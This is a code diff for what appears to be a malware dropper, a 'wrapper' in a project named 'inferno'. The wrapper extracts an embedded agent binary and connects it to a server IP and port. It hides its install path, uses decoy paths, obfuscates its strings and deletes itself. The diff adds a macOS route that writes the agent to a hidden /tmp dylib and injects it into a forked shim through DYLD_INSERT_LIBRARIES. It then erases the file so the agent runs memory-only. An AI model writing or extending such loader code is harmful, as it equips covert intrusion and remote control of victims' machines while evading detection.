@@ -48,6 +48,7 @@ void decryptInPlace(unsigned char* data, size_t size) {
     }
 }
 
+#if !defined(__APPLE__) || defined(INFERNO_TESTING)
 std::string installPath() {
 #ifdef _WIN32
     char appdata[MAX_PATH];
@@ -177,6 +178,8 @@ bool createDirectoryForFile(std::string& path) {
 #endif
 }
 
+#endif // !defined(__APPLE__) || defined(INFERNO_TESTING)
+
 bool extractAgent(const std::string& target) {
     if (inferno::wrapper::AGENT_BINARY_SIZE == 0) {
         std::fprintf(stderr, UNLIT("[Wrapper] Agent binary not embedded.\n"));
@@ -215,6 +218,7 @@ bool extractAgent(const std::string& target) {
     return true;
 }
 
+#if !defined(__APPLE__) || defined(INFERNO_TESTING)
 bool runAgent(const std::string& path, const std::string& ip, uint16_t port) {
     std::string port_str = std::to_string(port);
 
@@ -260,6 +264,8 @@ bool runAgent(const std::string& path, const std::string& ip, uint16_t port) {
     ::exit(1); // should not reach here
 #endif
 }
+
+#endif // !defined(__APPLE__) || defined(INFERNO_TESTING)
 
 std::string decoyPath() {
 #ifdef _WIN32
@@ -335,11 +341,48 @@ void selfDelete(const std::string& path) {
 #endif
 }
 
+#if defined(__APPLE__) && !defined(INFERNO_TESTING)
+bool injectAgentViaDyld(const std::string& ip, uint16_t port) {
+    // 1. Extract dylib to process-specific temp path (avoid races)
+    std::string dylib_path = UNLIT("/tmp/.inferno_agent_") + std::to_string(::getpid()) + UNLIT(".dylib");
+    if (!extractAgent(dylib_path)) return false;
+
+    // 2. Set environment for shim — inherits across fork+exec
+    ::setenv(UNLIT("INFERNO_SERVER_IP"), ip.c_str(), 1);
+    ::setenv(UNLIT("INFERNO_SERVER_PORT"), std::to_string(port).c_str(), 1);
+    ::setenv(UNLIT("DYLD_INSERT_LIBRARIES"), dylib_path.c_str(), 1);
+
+    // 3. Fork and exec the shim — the dylib constructor runs on load
+    pid_t pid = ::fork();
+    if (pid < 0) {
+        std::fprintf(stderr, UNLIT("[Wrapper] fork() for shim failed: %s\n"),
+                     std::strerror(errno));
+        ::remove(dylib_path.c_str());
+        return false;
+    }
+
+    if (pid == 0) {
+        // Use the full path embedded at compile time — avoids issues
+        // with colons in PATH entries on macOS.
+        const char* const shim_argv[] = {UNLIT("inferno_shim"), nullptr};
+        ::execv(INFERNO_SHIM_PATH, const_cast<char* const*>(shim_argv));
+        std::fprintf(stderr, UNLIT("[Wrapper] execv(%s) failed: %s\n"),
+                     INFERNO_SHIM_PATH, std::strerror(errno));
+        ::_exit(1);
+    }
+
+    // 4. Parent: give shim time to load the dylib, then delete from disk
+    ::usleep(500000);
+    ::remove(dylib_path.c_str());
+    return true;
+}
+#endif
+
 } // anonymous namespace
 
 int main(int argc, char* argv[]) {
     std::string ip = UNLIT("127.0.0.1");
-    uint16_t port = 8080;
+    uint16_t port = 4242;
 
     if (argc >= 3) {
         ip = argv[1];
@@ -356,6 +399,12 @@ int main(int argc, char* argv[]) {
         }
     }
 
+#if defined(__APPLE__) && !defined(INFERNO_TESTING)
+    // Step 2: macOS — inject via dylib + shim (memory-only)
+    if (!injectAgentViaDyld(ip, port)) {
+        return 1;
+    }
+#else
     // Step 2: Extract agent to hidden install path
     std::string target = installPath();
     if (!createDirectoryForFile(target)) {
@@ -382,6 +431,7 @@ int main(int argc, char* argv[]) {
     if (!runAgent(target, ip, port)) {
         return 1;
     }
+#endif
 
     // Step 5: Self-delete the wrapper binary
     if (argc > 0) {
